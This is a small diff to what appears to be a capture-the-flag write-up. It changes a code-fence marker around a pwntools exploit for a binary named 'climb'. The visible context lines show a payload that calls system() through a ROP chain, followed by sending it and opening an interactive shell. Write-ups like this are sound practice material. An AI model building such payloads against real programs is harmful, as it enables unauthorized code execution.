@@ -31,7 +31,7 @@ will allow us to write from the rax to the location on the rdx.
 
 The only thing left is to build the payload.  Below is the exploit code I used:
 
-'''python
+```Python3
 from pwn import *
 
 target = './climb'
@@ -64,4 +64,4 @@ pl += p64(0x400530)                 # call system()
 print(p.recvuntil('respond?'))
 p.send(pl)
 p.interactive()
-'''
+```
